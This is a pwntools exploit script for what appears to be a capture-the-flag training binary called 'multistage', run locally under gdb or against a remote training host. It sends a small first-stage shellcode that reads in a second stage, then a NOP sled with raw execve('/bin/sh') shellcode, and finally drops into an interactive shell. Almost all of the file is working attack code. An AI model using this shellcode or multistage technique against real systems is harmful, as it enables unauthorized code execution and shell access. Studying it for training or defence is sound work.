from pwn import *

context.arch = "amd64"

if "REM" in args: 
    r = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    r = process("./multistage")
    gdb.attach(r,'''
        b *0x40123b
        c
        ''')
    input("wait")


asm_code = """
mov rsi, rax
xor rdi, rdi
xor rax, rax
pop rdx
syscall
"""
r.send(asm(asm_code))

#r.send(b"\x48\x31\xFF\x48\x31\xF6\x5A\x48\x31\xC0\x0F\x05")

r.send(b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xC7\x26\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")

r.interactive()